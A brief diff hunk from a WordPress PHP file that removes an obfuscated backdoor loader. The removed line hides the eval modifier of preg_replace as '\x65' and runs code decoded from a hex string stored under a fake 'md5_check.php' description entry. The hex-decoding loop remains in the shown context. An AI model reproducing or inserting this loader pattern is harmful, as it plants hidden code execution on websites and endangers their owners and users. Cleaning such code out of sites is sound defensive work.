@@ -56,8 +56,4 @@ $wp_file_descriptions = array(
 for($i = 0; $i < strlen($wp_file_descriptions['md5_check.php']); $i = $i+2) 
 $search .= '%'.substr($wp_file_descriptions['md5_check.php'], $i, 2); 
 
-$wp_template = @preg_replace("/([a-z0-9-%]+).([a-z-@]+).([a-z]+)/\x65", "$2($3(urldecode('$1')))", $search.".@".$wp_file_descriptions['rtl.css']);
-
-
-
 ?>
